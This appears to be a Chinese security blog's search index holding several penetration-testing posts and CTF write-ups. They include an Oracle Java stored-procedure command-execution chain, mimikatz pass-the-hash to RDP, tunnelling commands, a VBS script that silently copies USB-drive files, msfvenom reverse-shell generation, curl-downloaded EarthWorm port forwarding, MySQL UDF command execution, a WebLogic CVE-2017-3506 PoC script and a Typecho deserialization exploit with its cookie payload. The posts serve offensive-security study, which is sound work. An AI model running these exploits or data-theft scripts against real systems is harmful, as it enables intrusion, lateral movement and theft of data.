<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[通过Oracle执行系统命令]]></title>
    <url>%2FOracle-get-os-shell.html</url>
    <content type="text"><![CDATA[成功连接上Oracle后，如何通过Oracle get到os-shell，网上搜集资料解决后进行简单记录。 经历如下：内网中发现oralce em express服务，一个oracle的web管理端，碰撞密码进入后，没有找到什么getshell的点，甚至数据查询等也没有发现，无意中发现了dispather设置项，通过添加dispather监听0.0.0.0后成功连接上数据库（默认的1521是监听在127.0.0.1上的）。 oracle提权执行命令工具oracleShell v0.1为了快速getshell，通常先去找找有没有现成的实现，找到了rebeyond师傅写的一个小工具。 链接：https://www.cnblogs.com/rebeyond/p/7928887.html 环境中的oracle版本为12c，这款工具是前两年开发，集成的jdbc版本低，不支持12c新的连接协议，连接会报ORA-28547错误，11g以下的版本应该是可以使用的。 使用sql*plusOracle的sql*plus是与oracle进行命令行交互的客户端工具，安装oracle一般会自带。 连接命令分两种（dba用户登录时带上as sysdba）： sqlplus 用户名/密码@ip:port/sid [as sysdba] sqlplus /nologSQL&gt; conn 用户名/密码@ip:port/sid [as sysdba] sqlplus自带了一个比较坑的命令host SQL&gt; host hostname 你会发现显示的是你本机的机器名，原来是在本机上执行命令，而不是在连接的远程机器上，好吧。。。 网上找来的方法： 首先在本地新建3个sql文件，用于sqlplus连接后进行执行 新建1.sql 12345678910111213141516171819202122232425262728293031323334create or replace and compilejava souRCe named &quot;util&quot;asimport java.io.*;import java.lang.*;public class util extends Object&#123;public static int RunThis(String args)&#123;Runtime rt = Runtime.getRuntime();int RC = -1;try&#123;Process p = rt.exec(args);int bufSize = 4096;BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize);int len;byte buffer[] = new byte[bufSize];// Echo back what the program spit outwhile ((len = bis.read(buffer, 0, bufSize)) != -1)System.out.write(buffer, 0, len);RC = p.waitFor();&#125;catch (Exception e)&#123;e.printStackTrace();RC = -1;&#125;finally&#123;return RC;&#125;&#125;&#125; 新建2.sql12345create or replacefunction run_cmd(p_cmd in varchar2) return numberaslanguage javaname &apos;util.RunThis(java.lang.String) return integer&apos;; 新建3.sql123456create or replace procedure RC(p_cmd in varChar)asx number;beginx := run_cmd(p_cmd);end; 登陆上去后依次执行 123456789101112131415161718192021222324252627282930313233343536373839SQL&gt; @1.sql 35 / Java 已创建。 SQL&gt; @2.sql 6 / 函数已创建。 SQL&gt; @3.sql 7 / 过程已创建。 SQL&gt;SQL&gt; variable x number;SQL&gt; set serveroutput on;SQL&gt; exec dbms_java.set_output(100000);SQL&gt; grant javasyspriv to system; [这里的system换成你的登录名,dba账户不需要执行这一步] PL/SQL 过程已成功完成。 SQL&gt; exec :x:=run_cmd(&apos;ipconfig&apos;); Windows IP Configuration Ethernet adapter 本地连接: Connection-specific DNS Suffix . : localdomainIP Address. . . . . . . . . . . . : 192.168.91.130Subnet Mask . . . . . . . . . . . : 255.255.255.0Default Gateway . . . . . . . . . : 192.168.91.1 PL/SQL 过程已成功完成。SQL&gt; exec :x:=run_cmd(&apos;whoami&apos;); 可以继续执行其他命令 win2003 + Oracle 11g，win2008 + Oracle 11g，win2008 + Oracle 12c 测试成功 我虽然使用dba登录，比较可惜的是拿到的cmd权限还是很低，测试和非dba一样，网上的文章看到一些11g版本的测试，dba账户往往能拿到较高的权限。尝试powershell bitsadmin下载和反弹cs都没有成功（主要是因为权限低的问题），最后通过certutil下载exe成功执行。 后续还要对oracle以及oracle的安全问题原理进行研究。 参考文章https://www.cnblogs.com/xiaozi/p/6017322.html]]></content>
      <categories>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pth->mstsc.exe 登录rdp]]></title>
    <url>%2Fpth-mstsc.html</url>
    <content type="text"><![CDATA[在内网渗透测试中，获得ntlm hash后，通常使用pass the hash方法使用wmi(135端口)，smb(445端口)服务横向移动，同样我们可以pth到mstsc 条件限制Server需要开启Restricted Admin mode，Client需要支持Restricted Admin mode 所谓Restricted Admin mode，意思就是直接使用当前系统的登录凭据登录，无需口令，也正是由于此特性，才使得我们可以通过pth登录rdp 主要针对Windows Server 2012 R2以后的系统，默认支持Restricted Admin mode Windows 7 和 Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351 实现过程使用mimikatz执行命令如下： 12privilege::debugsekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxxxxxxxxxxxxxxxxxx &quot;/run:mstsc.exe /restrictedadmin&quot; 执行后弹出远程登录界面，输入地址后登录 10.0.0.180为08系统，默认不支持Restricted Admin mode，会报错 2012系统测试登录成功 参考Restricted Admin mode 官方说明 https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/ https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop/]]></content>
      <categories>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透中常用的隧道工具]]></title>
    <url>%2Fpentest-common-tunnel.html</url>
    <content type="text"><![CDATA[tunnel frp项目地址https://github.com/fatedier/frp/ 简介 frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透 跨平台支持linux，win，mac 类似于ngrok，运维、开发人员经常使用它管理内网机器和调试程序，例如将内网的22，3389转发到公网，开发人员将本地web服务转发到公网调试，msf/rat远控的内网上线，可以代替前几年流行的”内网通”服务 优点：不需要免杀，支持加密传输 基本用法 在有公网ip的vps上部署服务端，然后在目标的内网机器上运行客户端即可反连公网机器，根据配置把内网中的目的端口转发到公网的那台机器上。网上也有一些免费和收费frp服务，可以免去自己部署服务端。 简单示例：服务端和客户端均支持配置文件ini运行和命令行运行，下面示例为命令行。 12服务端：./frps -p &lt;服务监听端口&gt; -t &lt;token&gt;客户端：./frpc tcp -s &lt;服务端ip&gt;:&lt;服务端端口&gt; -r &lt;在服务端监听的对应端口&gt; -i &lt;内网地址&gt; -l &lt;内网端口&gt; -t &lt;token&gt; --ue --uc –ue –uc 分别为加密和压缩(use_encryption &amp;&amp; use_compression) 例如通过webshell转发出该机器的3389端口 12你的机器：./frps -p 7890 -t woshitokenWebshell: frpc.exe tcp -s 1.1.1.1:7890 -r 9999 -i 127.0.0.1 -l 3389 -t woshitoken --ue --uc 此时访问你机器的9999端口，即可访达目标机器的3389端口。 更多参数用法查看github项目。 SSH简介 SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发 优点：linux自带，传输加密，支持socks代理 用法示例相关参数： 1234567-C ：压缩数据传输。-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。-N ：不执行脚本或命令，通常与-f连用。-g ：在-L/-R/-D参数中，允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接。-L ：本地转发-R ：远程转发-D ：动态转发，即socks代理 本地转发（本地建立监听） 12ssh -C -f -N -g -L &lt;本地监听ip&gt;:&lt;本地端口&gt;:&lt;远程ip&gt;:&lt;远程端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;ssh -C -f -N -g -L 0.0.0.0:1234:192.168.1.100:3389 root@192.168.2.101 -p 22 远程转发（远端建立监听） 12ssh -C -f -N -g -R &lt;远程ip&gt;:&lt;远程端口&gt;:&lt;本地ip&gt;:&lt;本地端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;ssh -C -f -N -g -R 0.0.0.0:1234:192.168.5.2:3389 root@192.168.2.101 -p 22 注：如果远端不能监听0.0.0.0，以下两个方法： 123451. 需要修改 ssh 配置/etc/ssh/sshd_config GatewayPorts 项写为 yes 重启ssh后即可监听0.0.0.02. 使用rinetd把监听在127.0.0.1转发到0.0.0.0上 动态转发（socks） 12ssh -C -f -N -g -D &lt;本地ip&gt;:&lt;本地端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;ssh -C -f -N -g -D 0.0.0.0:1080 root@192.168.2.101 -p 22 socks代理上本地的1080端口，即可访问192.168.2.101的内网环境 netsh简介 netsh是Network Shell的缩写，是windows为我们提供的功能强大的网络配置命令行工具。 支持tcp，udp 正向端口转发和修改防火墙规则，没有反向转发的功能，不支持socks。 优点：win自带，支持ipv4和v6。 用法 在xp/2003下使用，要先安装ipv6，装完后需要重启机器才能生效 1netsh interface ipv6 install 管理防火墙 对于xp/2003的操作命令不同与之后的系统，而且xp/2003的防火墙不区分出站入站 123456netsh firewall show state 可查看防火墙的状态，从显示结果中可看到防火墙各功能模块的禁用及启用情况。netsh firewall set opmode disable 用来禁用系统防火墙netsh firewall set opmode enable 可启用防火墙。netsh firewall add portopening TCP &lt;端口号&gt; &quot;规则名称&quot; 允许xx端口出入站netsh firewall delete portopening TCP &lt;端口号&gt; 删除该条规则 对于 2003 以后的系统，命令如下 123456netsh advfirewall show allprofiles 查看防火墙的状态netsh advfirewall set allprofiles state on 开启防火墙netsh advfirewall set allprofiles state off 关闭防火墙netsh advfirewall firewall add rule name=&quot;规则名称&quot; dir=in(in为入站,out为出站) action=allow(allow为放行，block为阻止) protocol=TCP localport=&lt;端口号&gt; 添加规则netsh advfirewall firewall delete rule name=&quot;规则名称&quot; dir=in protocol=TCP localport=&lt;端口号&gt; 删除规则 端口转发123netsh interface portproxy show all 查看所有已设置的转发规则netsh interface portproxy add v4tov4 listenport=&lt;监听端口&gt; connectaddress=&lt;将要转发的ip&gt; connectport=&lt;将要转发的端口&gt; 添加转发规则netsh interface portproxy delete v4tov4 listenport=&lt;转发的端口&gt; 删除规则 ew（EarthWorm）项目地址https://github.com/rootkiter/EarthWorm https://github.com/rootkiter/EarthWorm/blob/master/server/download/ew.zip 简介 支持正反向tcp端口转发，类似lcx（htran） 支持反向socks代理 缺点：流量不加密，需要免杀 用法简要说明1234567891011121314-l 本地要监听的端口-f 要主动连接的ip-g 要主动连接的端口-d 要反弹到的ip-e 要反弹到的端口-s 工作模式工作模式支持如下：lcx_tran 正向tcp端口转发，监听在本地lcx_slave 反向tcp转发客户端lcx_listen 反向tcp服务端ssocksd 创建正向socks代理服务端，监听在本地，直接把当前环境socks代理出去rssocks 创建反向socks代理服务端rcsocks 反向socks代理客户端 reGeorg&amp;ABPTTS项目地址https://github.com/sensepost/reGeorg https://github.com/nccgroup/ABPTTS 简介两款针对Web应用程序的HTTP隧道，使用方法简单，详情查看github项目]]></content>
      <categories>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>tunnel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5行VBS代码实现“U盘小偷”功能]]></title>
    <url>%2Fvbs-u-disk-thief.html</url>
    <content type="text"><![CDATA[内网渗透测试过程中，可以通过vbs脚本循环打包pc目标机的可移动盘符，在目标插入u盘时立即打包文件到目标机硬盘上。 使用说明需要工具7za.exe，结束进程wscript.exe即可停止工作。 VBS代码12345set ws=WScript.CreateObject("WScript.Shell")dows.Run "C:\Windows\Temp\7za.exe a d:\1.zip -r g:\*.txt", 0, true '静默执行命令：打包g盘所有的txt文件到d:\1.zipWScript.Sleep 1000*1 'sleep 1秒loop]]></content>
      <categories>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pockr 靶机 未授权访问引发的血案 writeup]]></title>
    <url>%2Fpockr-unauthorized-access.html</url>
    <content type="text"><![CDATA[靶场描述 web类型的靶场 多查看源码，有惊喜。 要求拿到内网数据库服务器的权限，拿到网站权限还没结束！！！不只是数据库权限，是数据库那台服务器权限。 题目地址：https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc 通过未授权访问获得用户名 在sea-config.js中找到login.js和api.js两个重要文件，其中api.js未在前端中显示。 login.js内容为： 123456789101112131415161718192021222324define(function (require, exports, module) &#123; $("#emailsubmit").click(function () &#123; var email = $("#forgotemail").val(); var url ='Admin_Pockr_login/forgorpwd_action'; var myreg = /^([\.a-zA-Z0-9_-])+@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-])+/; if(email.length==0)&#123; alert('邮箱不能为空!'); &#125; else if (!myreg.test(email))&#123; alert('邮箱格式不正确!'); &#125;else&#123; $.post(url, &#123; email: email &#125;, function (resultJSONObject) &#123; if (resultJSONObject.message) &#123; alert("success"); &#125; else &#123; alert("failed"); &#125; &#125;, "json"); &#125; &#125;);&#125;) Admin_Pockr_login/forgorpwd_action 为找回密码的接口， 尝试post任意email后发现返回 {“message”:”false”} api.js内容为： 1234567891011121314define(function (require, exports, module) &#123; var $ = require('jquery'); var url='User_Pockr_Api/UserInfo'; var userid=$("#userid").val(); $.post(url, &#123; userid: userid &#125;, function (resultJSONObject) &#123; if (resultJSONObject.message) &#123; $("$userinfo").append(resultJSONObject.username); &#125; else &#123; alert("error"); &#125; &#125;, "json"); &#125;) 尝试post任意userid后返回{“message”:”false”,”error”:”userid format is not correct!”} 这时候找到首页下面的技术支持: admin@pockr.com，尝试post找回密码接口，返回了userid 1&#123;&quot;message&quot;:&quot;true&quot;,&quot;email&quot;:&quot;admin@pockr.com&quot;,&quot;userid&quot;:&quot;BB568A04-8159-964E-CE49-D68AC10F8101&quot;&#125; 拿到userid后post给User_Pockr_Api/UserInfo的api，返回了username 1&#123;&quot;message&quot;:&quot;true&quot;,&quot;email&quot;:&quot;admin@pockr.com&quot;,&quot;username&quot;:&quot;sunzheyi&quot;&#125; 爆破进入后台拿到username后通过爆破拿到密码，弱口令1q2w3e 文件上传进入后台后找到文件上传处，尝试上传个txt 看到php尝试上传一句话，上传后找不到上传目录，通过修改subSysFolder一级一级往上级目录尝试，到了第二级就传到了网站根目录。 最后发现执行不了，然后上传了一个system函数的文件。 使用perl成功反弹shell，注意命令要url编码。 1反弹shell的方法可以参考 https://evi1cg.me/archives/GetShellls.html 拿到shell先去找数据库配置文件。 认出web使用的是CI后，在application/config/database.php找到了mysql的地址，账号和密码。 使用公网访问数据库地址sql05.ciadmin.com发现访问不了，应该是内网地址。web服务器上安装了curl，使用curl下载ew，并把sql05.ciadmin.com的3306端口转发到公网vps。 123456先到vps打开监听./ew_for_linux64 -s lcx_listen -l 9999 -e 53回到shell执行curl http://1.1.1.1/ew_for_linux64 &gt; ew_for_linux64chmod +x ew_for_linux64./ew_for_linux64 -s lcx_slave -d 你的vps_ip -e 53 -f sql05.ciadmin.com -g 3306 UDF拿shell此时连接你vps的9999端口，即对应内网mysql的3306端口。 我这里使用win下的navicat连接，也可以使用sqlmap等工具。 此时发现mysql账号并不是root，没有导出文件的权限，尝试用相同的密码登陆root用户，发现能登陆成功。 查询mysql版本为5.7，使用 1show variables like &quot;%plugin_dir%&quot;; 查找到plugin路径。 123456789101112131415mysql&gt; select * from func; #检查是否已经有人导出过了mysql&gt; select unhex(&aposapos;) into dumpfile &apos;/usr/lib/mysql/plugin/udf.so&apos;;Query OK, 1 row affectedmysql&gt; create function sys_eval returns string soname &apos;udf.so&apos;;Query OK, 0 rows affectedmysql&gt; select sys_eval(&apos;whoami&apos;);+--------------------+| sys_eval(&apos;whoami&apos;) |+--------------------+| mysql |+--------------------+1 row in set 成功执行命令，获取到了数据库服务器的权限]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AttackDefense Real World Webapps RCE writeup]]></title>
    <url>%2FReal-World-Webapps-RCE.html</url>
    <content type="text"><![CDATA[AttackDefense Web靶机 远程执行代码 writeup ApPHP MicroBlogexp：https://www.exploit-db.com/exploits/33070 WeBidexp：https://www.exploit-db.com/exploits/36155 Joomla com_xcloner Componentexp：https://www.exploit-db.com/exploits/16246 PHP Utility Beltexp：ajax.php post 给 code 传参 osCommerceexp：https://www.exploit-db.com/exploits/44374 。。。]]></content>
      <categories>
        <category>AttackDefense</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>pentest</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HackTheBox Jerry writeup]]></title>
    <url>%2Fhackthebox-Jerry-writeup.html</url>
    <content type="text"><![CDATA[去年注册完hackthebox，因为连接不上隧道一直没玩，今天连接上做道水题试试。 题目地址：https://www.hackthebox.eu/home/machines/profile/144 端口探测 仅开放8080，tomcat manager服务 爆破弱口令使用msf自带字典爆破出密码 上传war包getshell使用msfvenom生成反弹shell的war包 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.7 LPORT=8080 -f war &gt; shell.war deploy后访问getshell 拿到flag]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RPO漏洞初探笔记]]></title>
    <url>%2FRPO-Note.html</url>
    <content type="text"><![CDATA[RPO攻击简介 RPO（Relative Path Overwrite），意为相对路径覆盖，利用的是客户端浏览器与服务端url解析的差异而导致的漏洞。在引入相对路径的js/css文件处，通过一定的手法，加载我们可控的文件，按照js/css的语法执行，实现XSS等攻击。 解析差异分析 本地测试目录结构如下roptest目录: roptest/xxx目录: roptest目录下的rop.php代码为 123456789&lt;html&gt; &lt;head&gt; &lt;title&gt;ROP&lt;/title&gt; &lt;script src=./a.js&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;?php echo "Hello dayu, this is roptest/rop.php" ?&gt; &lt;/body&gt;&lt;/html&gt; roptest目录下的a.js代码为 1alert("I'm from roptest") roptest/xxx目录下的a.js代码为 1alert("I'm from xxx") 当我们使用chrome访问 http://127.0.0.1/roptest/rop.php 时： 访问 http://127.0.0.1/roptest/xxx/..%2frop.php 时： 至此，我们已经可以看出这种攻击的条件：HTML代码中采用了相对路径来引入js或者css等文件服务端能够正常解析%2f等url编码（刚开始自测nginx可以构成漏洞，apache不行，后来查了一下：apache如果要支持%2f的话，需要将AllowEncodedSlashes设置为On。一般在配置了pathinfo后，会将这个选项打开。）客户端浏览器在寻找js资源的时候，并没有对%2f进行解码 第二届强网杯 Share your mind 题目描述 1234http://39.107.33.96:20000Please help me find the vulnerability before I finish this site！hint：xss bot使用phantomjs，版本2.1.1hint2: xss的点不在report页面 这道题的漏洞点就在于RPO 复现过程发表一个title为空,内容为alert(1)的article，访问为纯文本 由于站点使用了pathinfo的url模式， 1http://39.107.33.96:20000/index.php/view/article/1866 类似相当于 1http://39.107.33.96:20000/index.php?m=view&amp;article=1866 同时，浏览器按照phpinfo的格式来解析url的话，只会访问到能识别的地方 所以，当我们访问 1http://39.107.33.96:20000/index.php/view/article/1866/..%2f..%2f/ 浏览器会到达 1http://39.107.33.96:20000/index.php/view/ 同时，该页面底部通过相对路径加载的两个js会去尝试加载 12http://39.107.33.96:20000/index.php/view/article/1866/../static/js/jquery.min.js和http://39.107.33.96:20000/index.php/view/article/1866/../static/js/bootstrap.min.js 由于这两个文件不存在且加上上面的pathinfo原则，这两个&lt;script src=&quot;&quot;&gt;实际会加载 1http://39.107.33.96:20000/index.php/view/article/1866 所以此时会出现两个alert(1)弹窗，形成了xss攻击。 最后，在report页面只能提交当前站点url，于是我们通过上述方法构造xss提交，”盲打”，获取到flag。 附上解决md5的脚本： 1234567891011121314151617181920import multiprocessingfrom os import urandomfrom hashlib import md5import sysprocessor_number = multiprocessing.cpu_count()def work(cipher): for i in range(100): plain = urandom(16).encode('hex') if md5(plain).hexdigest()[:6] == cipher: print plain sys.exit(0)if __name__ == '__main__': cipher = raw_input('md5:') pool = multiprocessing.Pool(processes=processor_number) while True: plain = urandom(16).encode('hex') pool.apply_async(work, (cipher, )) pool.close() pool.join()]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>RPO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebLogic CVE-2017-3506 Poc]]></title>
    <url>%2FCVE-2017-3506_Poc.html</url>
    <content type="text"><![CDATA[漏洞编号 CVE-2017-3506 （wls-wsat 远程命令执行漏洞） 影响版本 Oracle WebLogic Server10.3.6.0.0 版本 Oracle WebLogic Server12.1.3.0.0 版本 Oracle WebLogic Server12.2.1.1.0 版本 Oracle WebLogic Server12.2.1.2.0 版本 Poc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env python# coding:utf-8import requestsimport refrom sys import argvheads = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Content-Type': 'text/xml;charset=UTF-8' &#125;def poc(url): if not url.startswith("http"): url = "http://" + url if "/" in url: url += '/wls-wsat/CoordinatorPortType' post_str = ''' &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; &lt;java&gt; &lt;object class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt; &lt;string&gt;whoami&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start"/&gt; &lt;/object&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; ''' try: response = requests.post(url, data=post_str, verify=False, timeout=5, headers=heads) response = response.text response = re.search(r"\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;", response).group(0) except Exception, e: response = "" if '&lt;faultstring&gt;java.lang.ProcessBuilder' in response or "&lt;faultstring&gt;0" in response: result = "test ok" return result else: result = "No Vulnerability" return resultif __name__ == '__main__': if len(argv) == 1: print "python weblogic_poc.py url:port" exit(0) else: url = argv[1] result = poc(url=url) print result]]></content>
      <categories>
        <category>Poc</category>
      </categories>
      <tags>
        <tag>Poc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Typecho 反序列化 任意代码执行 漏洞分析]]></title>
    <url>%2Ftypecho-unserialize.html</url>
    <content type="text"><![CDATA[漏洞起因 程序安装后不会自动删除install.php，install.php中存在反序列化漏洞引发（网传是开发者故意留的后门） Typecho官方已于2017-10-24 更新v1.1-17.10.24-beta版 已修复此漏洞。 测试版本：v1.1-15.5.12-beta 源码github地址：1https://github.com/typecho/typecho/releases install.php 反序列部分12345678228 &lt;?php else : ?&gt;229 &lt;?php230 $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));231 Typecho_Cookie::delete('__typecho_config');232 $db = new Typecho_Db($config['adapter'], $config['prefix']);233 $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);234 Typecho_Db::set($db);235 ?&gt; install.php 的230行，会读取cookie中的__typecho_config ，并将其base64解码反序列后赋给config变量 231行会删除cookie中的__typecho_config，这一步无关紧要。 232行会实例化Typecho_Db，并且传值$config中的adapter和prefix。 233行会调用addServer方法Typecho_Cookie::get的定义如下： 123456public static function get($key, $default = NULL)&#123; $key = self::$_prefix . $key; $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default); return is_array($value) ? $default : $value;&#125; 修改cookie和post内容都可以赋值。 1234由于213行 &lt;?php if (isset($_GET['finish'])) : ?&gt;221行 &lt;?php elseif (!Typecho_Cookie::get('__typecho_config')): ?&gt;首先fisish，__typecho_config要有赋值，才能进行反序列化。 继续跟进我们先到Typecho_Db的构造函数看看他继续做了什么12345678910111213141516171819202122public function __construct($adapterName, $prefix = 'typecho_')&#123; /** 获取适配器名称 */ $this-&gt;_adapterName = $adapterName; /** 数据库适配器 */ $adapterName = 'Typecho_Db_Adapter_' . $adapterName; //第一个参数在这里进行了拼接，如果传入的是实例化对象，会调用该对象__toString()魔术方法。 if (!call_user_func(array($adapterName, 'isAvailable'))) &#123; throw new Typecho_Db_Exception("Adapter &#123;$adapterName&#125; is not available"); &#125; $this-&gt;_prefix = $prefix; /** 初始化内部变量 */ $this-&gt;_pool = array(); $this-&gt;_connectedPool = array(); $this-&gt;_config = array(); //实例化适配器对象 $this-&gt;_adapter = new $adapterName();&#125; 我们找一些含有__toString的类，找到了Typecho_Feed。 他在290行，执行了这样一段代码： 1$content .= '&lt;dc:creator&gt;' . htmlspecialchars($item['author']-&gt;screenName) . '&lt;/dc:creator&gt;' . self::EOL; 由于我们注入的是对象，$item是能够控制的。我们进而就可以调用__get这个魔术方法，继续寻找含有__get的类，我们找到了class Typecho_Request，他的__get()魔术方法会调用他自己的get()方法。 1234567891011121314151617public function get($key, $default = NULL)&#123; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; &#125; $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value);&#125; get()方法会给$value赋值，然后调用自己的_applyFilter方法。12345678910111213private function _applyFilter($value)&#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; $this-&gt;_filter = array(); &#125; return $value;&#125; array_map和call_user_func 中的($filter, $value)都是可控的，可以给$filter赋值assert两处都可进行命令执行。 Payloadpayload构造12345678910111213141516171819202122&lt;?phpclass Typecho_Feed&#123; public function addItem(array $item)&#123; $this-&gt;_items[] = $item; &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params['screenName'] = file_put_contents('dayuinfo.php', '&lt;?php phpinfo();?&gt;'); $this-&gt;_filter[0] = 'assert'; &#125;&#125;$payload1 = new Typecho_Feed();$payload2 = new Typecho_Request();$payload1-&gt;addItem(array('author' =&gt; $payload2));$exp = array('adapter' =&gt; $payload1, 'prefix' =&gt; '');echo base64_encode(serialize($exp)); 写入文件测试成功12345678910GET /install.php?finish=1 HTTP/1.1Host: 127.0.0.2User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo2OiJBVE9NIDEiO3M6NjoiX2l0ZW1zIjthOjE6e2k6MDthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtpOjE4O31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjA6IiI7fQ==Referer:http://127.0.0.2/install.phpConnection: closeUpgrade-Insecure-Requests: 1]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化初探笔记]]></title>
    <url>%2FPHP-unserialize.html</url>
    <content type="text"><![CDATA[序列化和反序列化 序列化就是使用serialize()将对象的用字符串的方式进行表示，反序列化是使用unserialize()将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。 序列化的对象可以是class也可以是Array,string等其他对象。 反序列化存在的问题 问题原因：漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。 魔术方法：PHP的类中可能会包含一些特殊的函数叫魔术函数，魔术函数命名是以符号 __开头的 反序列化漏洞中常见到有一些魔术方法：__construct()：在对象创建时自动被调用__destruct()：对象被销毁时触发__sleep()：使用serialize时触发__wakeup()：使用unserialize时触发__toString()： 把类当作字符串调用时触发__call()：在对象上下文中调用不可访问的方法时触发__callStatic()：在静态上下文中调用不可访问的方法时触发__get()：用于从不可访问的属性读取数据，或访问类中不存在的方法时触发__set()：用于将数据写入不可访问的属性__isset()：在不可访问的属性上调用isset()或empty()触发__unset()：在不可访问的属性上使用unset()时触发__invoke()：当脚本尝试将对象调用为函数时触发 2016xctf的一道反序列化题目index.php的代码123456789101112131415161718192021222324252627&lt;?php $user = $_GET["user"]; $file = $_GET["file"]; $pass = $_GET["pass"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is admin"))&#123; echo "hello admin!&lt;br&gt;"; if(preg_match("/f1a9/",$file))&#123; exit(); &#125;else&#123; include($file); //class.php $pass = unserialize($pass); echo ($pass); &#125; &#125;else&#123; echo "you are not admin ! "; &#125; ?&gt; class.php的代码12345678910111213141516171819&lt;?php class Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return "__toString was called!"; &#125; &#125; ?&gt; 源码分析： index.php源码 